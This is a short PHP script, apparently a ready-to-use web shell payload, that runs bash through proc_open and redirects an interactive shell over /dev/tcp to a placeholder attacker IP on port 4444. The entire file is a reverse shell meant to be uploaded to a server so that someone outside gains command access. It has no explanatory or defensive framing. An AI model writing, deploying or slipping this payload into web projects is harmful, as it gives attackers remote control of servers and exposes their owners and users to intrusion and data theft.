<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$ip = 'YOUR_IP_HERE';
$port = 4444;

$process = proc_open("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'", $descriptorspec, $pipes);

if (is_resource($process)) {
    // You might want to handle input/output here if necessary
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
